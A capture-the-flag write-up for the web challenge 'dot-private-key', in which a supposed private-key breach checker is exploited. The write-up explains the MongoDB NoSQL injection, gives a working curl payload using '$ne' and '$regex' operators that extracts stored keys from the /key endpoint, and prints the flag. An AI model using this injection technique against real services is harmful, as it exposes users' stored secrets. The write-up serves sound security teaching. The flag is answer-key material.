# CTF Write-up: dot-private-key

**Challenge:** dot-private-key  
**Points:** 100  
**Author:** RaduTek  
**Category:** Web

## Description

Our security researcher has found this dubious website claiming to check any private keys for potential breaches in a secure manner. They think otherwise.

Attached are some clean keys that our researcher tried to check with the website a few days ago. Curiously, they have been exposed since.

Your task is to see if this website is truly up to what it claims.

## Analysis

The challenge description suggests that:

1. There's a website that claims to check private keys for breaches "securely"
2. Keys that were supposedly "clean" have been exposed after being checked
3. We need to investigate if the website is actually secure

This immediately raises suspicions about the website potentially storing or logging the keys that users submit for checking.

## Investigation

Looking at the provided solution command:

```bash
curl -s "http://ctf.ac.upt.ro:9831/key" -H 'Content-Type: application/json' \
-d '{"type":{"$ne":null},"key":{"$regex":"^ctf\\{"}}' \
| python3 -c 'import sys,json; d=json.load(sys.stdin); b=d.get("breach"); print(b["key"]) if b else None'
```

This reveals several key insights:

### 1. MongoDB NoSQL Injection

The payload uses MongoDB query operators:

- `{"type":{"$ne":null}}` - finds documents where the "type" field is not null
- `{"key":{"$regex":"^ctf\\{"}}` - finds documents where the "key" field matches the regex pattern starting with "ctf{"

This suggests the backend is using MongoDB and is vulnerable to NoSQL injection attacks.

### 2. API Endpoint Analysis

- **Endpoint:** `/key`
- **Method:** POST (sending JSON data)
- **Response:** JSON containing a "breach" object with a "key" field

### 3. Attack Vector

The website appears to:

1. Accept private keys from users for "breach checking"
2. Store these keys in a MongoDB database
3. Have an API endpoint that's vulnerable to NoSQL injection
4. Allow attackers to extract stored keys using malicious queries

## Exploitation Steps

1. **Identify the vulnerability:** The `/key` endpoint accepts JSON input and processes it directly in MongoDB queries without proper sanitization.

2. **Craft the payload:**

   - Use `$ne` (not equal) operator to bypass authentication/filtering
   - Use `$regex` operator to search for keys starting with "ctf{" (flag format)

3. **Extract the flag:**

   ```bash
   curl -s "http://ctf.ac.upt.ro:9831/key" \
   -H 'Content-Type: application/json' \
   -d '{"type":{"$ne":null},"key":{"$regex":"^ctf\\{"}}' \
   | python3 -c 'import sys,json; d=json.load(sys.stdin); b=d.get("breach"); print(b["key"]) if b else None'
   ```

4. **Result:** The flag is extracted from the response JSON.

## Flag

```
ctf{284dc217ce36b9133c561207af3dbf6b8656323d6375f3f5c8c955be0a2aab66}
```
